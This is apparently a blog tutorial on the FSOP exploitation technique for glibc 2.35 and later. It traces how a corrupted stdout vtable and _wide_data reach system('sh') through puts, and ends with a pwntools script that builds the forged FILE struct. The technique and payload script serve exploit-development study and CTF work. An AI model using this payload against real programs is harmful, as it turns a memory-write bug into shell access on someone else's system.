---
published: true
layout: post
title: FSOP for libc >= 2.35
date: 2023-11-23 00:00:00 +0900 
category: Exploit Technique
description: " "
tags:
  - FSOP
excerpt_separator: <!--more-->
---
Since GLIBC 2.35, achieving arbitrary code execution with arbitrary address write primitive has become more challenging. The good old days of malloc/free hooks are gone, and libc has enabled full RELRO enabled by default, which makes it impossible to  overwrite something like strlen@got. In this post, we will explore how to achieve code execution using FSOP(File Stream Oriented Programming) with arbitrary address write (AAW) primitive in modern libc versions.
<!--more-->

## `_IO_FILE`  struct
---
```c
#include <stdio.h>

int main()
{
    FILE* fp = fopen("test.txt", "w");
    fprintf(fp, "Hello World!\n");
    fclose(fp);
}
```
To understand FSOP, we should understand how FILE struct is used in IO functions.
FILE struct which `fopen()` returns looks like below. 

```c
// https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/bits/types/FILE.h#L6
/* The opaque type of streams.  This is the definition used elsewhere.  */
typedef struct _IO_FILE FILE;

gef➤  ptype struct _IO_FILE
type = struct _IO_FILE {
    int _flags;
    char *_IO_read_ptr;
    char *_IO_read_end;
    char *_IO_read_base;
    char *_IO_write_base;
    char *_IO_write_ptr;
    char *_IO_write_end;
    char *_IO_buf_base;
    char *_IO_buf_end;
    char *_IO_save_base;
    char *_IO_backup_base;
    char *_IO_save_end;
    struct _IO_marker *_markers;
    struct _IO_FILE *_chain;
    int _fileno;
    int _flags2;
    __off_t _old_offset;
    unsigned short _cur_column;
    signed char _vtable_offset;
    char _shortbuf[1];
    _IO_lock_t *_lock;
    __off64_t _offset;
    struct _IO_codecvt *_codecvt;
    struct _IO_wide_data *_wide_data;
    struct _IO_FILE *_freeres_list;
    void *_freeres_buf;
    size_t __pad5;
    int _mode;
    char _unused2[20];
}
```
`ptype struct _IO_FILE` shows how file struct looks like.
There are several member variables, and we will only discuss about the necessary ones later.

<br/>
<br/>
## Following the control flow of `puts`
---

```c
// https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/ioputs.c#L31
int
_IO_puts (const char *str)
{
  int result = EOF;
  size_t len = strlen (str);
  _IO_acquire_lock (stdout);

  if ((_IO_vtable_offset (stdout) != 0
       || _IO_fwide (stdout, -1) == -1)
      && _IO_sputn (stdout, str, len) == len
      && _IO_putc_unlocked ('\n', stdout) != EOF)
    result = MIN (INT_MAX, len + 1);

  _IO_release_lock (stdout);
  return result;
}

weak_alias (_IO_puts, puts)
libc_hidden_def (_IO_puts)

```
We will start from the function `puts`, which is commonly used to output strings. It calls `_IO_sputn` after a few function calls.

```c
#define _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)
#define _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)
#define JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1, X2)

# define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))
```
Following the glibc definitions, calling `_IO_sputn` equals to calling `stdout->vtable->__xsputn()`. Also there is a validation for vtable, `IO_validate_vtable()`, which is done before calling __xsputn.

```c
/* Perform vtable pointer validation.  If validation fails, terminate
   the process.  */
static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
  /* Fast path: The vtable pointer is within the __libc_IO_vtables
     section.  */
  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
  uintptr_t ptr = (uintptr_t) vtable;
  uintptr_t offset = ptr - (uintptr_t) __start___libc_IO_vtables;
  if (__glibc_unlikely (offset >= section_length))
    /* The vtable pointer is not in the expected section.  Use the
       slow path, which will terminate the process if necessary.  */
    _IO_vtable_check ();
  return vtable;
}
```
And `IO_validate_vtable()` checks if the vtable is inside the vtable section of libc. 

To summarize, calling `puts()` leads to calling stdout->vtable->__xsputn() with the vtable validation.
FSOP techniques used after glibc 2.35 abuses `_wide_vtable`, which calls its member functions without validation, and also it's inside the libc vtable section.  

From below, We'll examine exactly how it works.

<br/>
<br/>
## Missing validation in `_wide_vtable`
---
```c
// https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/wgenops.c#L363
void
_IO_wdoallocbuf (FILE *fp)
{
  if (fp->_wide_data->_IO_buf_base)
    return;
  if (!(fp->_flags & _IO_UNBUFFERED))
    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)
      return;
  _IO_wsetb (fp, fp->_wide_data->_shortbuf,
		     fp->_wide_data->_shortbuf + 1, 0);
}
libc_hidden_def (_IO_wdoallocbuf)

```
`_IO_wdoallocbuf` internally calls `_IO_WDOALLOCATE` which is called through referencing `_wide_vtable`.

```c
// https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L223
#define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)

// https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L130
#define WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)->FUNC) (THIS)

// https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L121
#define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)

// https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L101
#define _IO_WIDE_JUMPS(THIS) \
  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)->_wide_vtable

// https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L94
#define _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) \
  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \
				       + offsetof(TYPE, MEMBER)))

```
Unlike `_IO_JUMPS` which validates vtable, we can see that `_IO_WIDE_JUMPS` directly casts to function pointer without any validation.

Abusing this absence of validation,
 
1. We will overwrite `_IO_2_1_stdout_.vtable` to make `_IO_2_1_stdout_.vtable->__xsputn == _IO_wfile_jumps->_IO_file_overflow`
2. We will also overwrite `_IO_2_1_stdout_._wide_data` to make  `_IO_2_1_stdout_._wide_data->_wide_vtable` point our fake vtable.

Then calling `puts` will further call `_IO_wfile_jumps->_IO_file_overflow` instead of `__xsputn`. And `_IO_wfile_jumps->_IO_file_overflow` will call functions from our fake vtable, which leads to arbitrary code execution (even with limited RDI control).

<br/>
<br/>
## Code Flow
---
Now let's follow the exact code flow to reach arbitrary code execution.

It can be briefly described as below.

`_IO_puts` → (`_IO_sputn` , corrupted vtable) → `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `_IO_WDOALLOCATE (fp)`

As there are a few constraints to follow this code path, I brought the constraints with relevant code.  

<br/>
<br/>
### puts
```c
// https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/ioputs.c#L31
int
_IO_puts (const char *str)
{
  int result = EOF;
  size_t len = strlen (str);
  _IO_acquire_lock (stdout);

  if ((_IO_vtable_offset (stdout) != 0
       || _IO_fwide (stdout, -1) == -1)
      && _IO_sputn (stdout, str, len) == len
      && _IO_putc_unlocked ('\n', stdout) != EOF)
    result = MIN (INT_MAX, len + 1);

  _IO_release_lock (stdout);
  return result;
}
```
* Constraints
1. As there is `_IO_acquire_lock`. `_IO_2_1_stdout.lock' should point to rw area.
2. `vtable->__xsputn` == `_IO_wfile_jumps->__overflow`(==`_IO_wfile_overflow`)

<br/>
<br/>
### _IO_wfile_overflow
```c
wint_t
_IO_wfile_overflow (FILE *f, wint_t wch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0)
    {
      /* Allocate a buffer if needed. */
      if (f->_wide_data->_IO_write_base == 0)
	{
	  _IO_wdoallocbuf (f);
		// [...]
	}
}
```
* Constraints (`f=stdout`)
1. `f->_flags & _IO_NO_WRITES == 0`
2. `f->_flags & _IO_CURRENTLY_PUTTING == 0`
3. `f->_wide_data->_IO_write_base == 0`

<br/>
<br/>
### _IO_wdoallocbuf
```c
void
_IO_wdoallocbuf (FILE *fp)
{
  if (fp->_wide_data->_IO_buf_base)
    return;
  if (!(fp->_flags & _IO_UNBUFFERED))
    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)

#define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)
```
* Constraints (`fp=stdout`)
1. `fp->_wide_data->_IO_buf_base == 0`
2. `fp->_flags & _IO_UNBUFFERED == 0`
3. `fp->_wide_data->_wide_vtable_->__doallocate == libc_system`

<br/>
<br/>
## Constraints
---
By satisfying these constraints, calling `puts` will call `system("sh")`; 

- puts
1. `fp = stdout` 
2. `fp->lock` → rw
3. `fp->vtable->__xsputn == _IO_wfile_overflow`

- _IO_wfile_overflow
1. `fp->_flags & _IO_NO_WRITES == 0`
2. `fp->_flags & _IO_CURRENTLY_PUTTING == 0`
3. `fp->_wide_data->_IO_write_base == 0`

- _IO_wdoallocbuf
1. `fp->_wide_data->_IO_buf_base == 0`
2. `fp->_flags & _IO_UNBUFFERED == 0`
3. `fp->_wide_data->_wide_vtable_->__doallocate == libc_system`

Now let's organized constrains for each member variable of stdout.

<br/>
<br/>


### fp->vtable
To satisfy `vtable->__xsputn == _IO_wfile_jumps.__overflow`, `fp->vtable` should be set to libc['_IO_wfile_jumps'] - 0x20`

<br/>
<br/>
### fp->_flags
```c
_flags & _IO_NO_WRITES == 0
_flags & _IO_CURRENTLY_PUTTING == 0
_flags & _IO_UNBUFFERED == 0

// #define _IO_NO_WRITES         0x0008
// #define _IO_CURRENTLY_PUTTING 0x0800
// #define _IO_UNBUFFERED        0x0002
```
At the last part of the code flow, `_IO_WDOALLOCATE (fp)` is called. Since `_flags` is the first member variable of `_IO_FILE`, setting it to `b"\x01\x01;sh;\x00\x00"` will make fp(stdout) point to "sh".

<br/>
<br/>


### fp->_wide_data
```c
_wide_data->_IO_buf_base == 0
_wide_data->_IO_write_base == 0
_wide_data->_wide_vtable_->__doallocate == libc_system
```
This part is a little tricky. By setting  `stdout->_wide_data` to `&_IO_2_1_stdout_ - 16`, 
and `stdout->_unused2[20]` to `p64(libc.symbols['system'])+ b"\x00"*4 + p64(libc.symbols['_IO_2_1_stdout_'] + 196 - 104)` we can make `_wide_data->_wide_vtable_->__doallocate` point to `libc_system`
`.

<br/>
<br/>
## Conclusion
---
```c
fp->_flags == b"\x01\x01;sh;\x00\x00"
fp->_lock == libc.symbols['_IO_2_1_stdout_'] + 0x10
fp->vtable = libc['_IO_wfile_jumps'] - 0x20
fp->_wide_data = libc.symbols['_IO_2_1_stdout_'] - 16
fp->_IO_read_ptr == 0
fp->_IO_write_base == 0
fp->_unused2 = p64(libc.symbols['system'])+ b"\x00"*4 + p64(libc.symbols['_IO_2_1_stdout_'] + 196 - 104)
```

By configuring stdout like above, calling `puts` will call `system("sh")`.
I made a simple python script to craft this struct easily.

```python
libc.address = libc_base
def FSOP_struct(flags = 0, _IO_read_ptr = 0, _IO_read_end = 0, _IO_read_base = 0,\
_IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0,\
_IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _markers= 0, _chain = 0, _fileno = 0,\
_flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0, _shortbuf = 0, lock = 0,\
_offset = 0, _codecvt = 0, _wide_data = 0, _freeres_list = 0, _freeres_buf = 0,\
__pad5 = 0, _mode = 0, _unused2 = b"", vtable = 0, more_append = b""):
    
    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00"*0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
    
    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

_IO_file_jumps = libc.symbols['_IO_file_jumps']
stdout = libc.symbols['_IO_2_1_stdout_']
log.info("stdout: " + hex(stdout))
FSOP = FSOP_struct(flags = u64(b"\x01\x01;sh;\x00\x00"), \
        lock            = libc.symbols['_IO_2_1_stdout_'] + 0x10, \
        _IO_read_ptr    = 0x0, \
        _IO_write_base  = 0x0, \
        _wide_data      = libc.symbols['_IO_2_1_stdout_'] - 0x10, \
        _unused2        = p64(libc.symbols['system'])+ b"\x00"*4 + p64(libc.symbols['_IO_2_1_stdout_'] + 196 - 104), \
        vtable          = libc.symbols['_IO_wfile_jumps'] - 0x20, \
        )
```

<br/>
<br/>
## Reference
---
* [Deep dive into FSOP](https://niftic.ca/posts/fsop/)

* [Angry-FSROP](https://blog.kylebot.net/2022/10/22/angry-FSROP/)
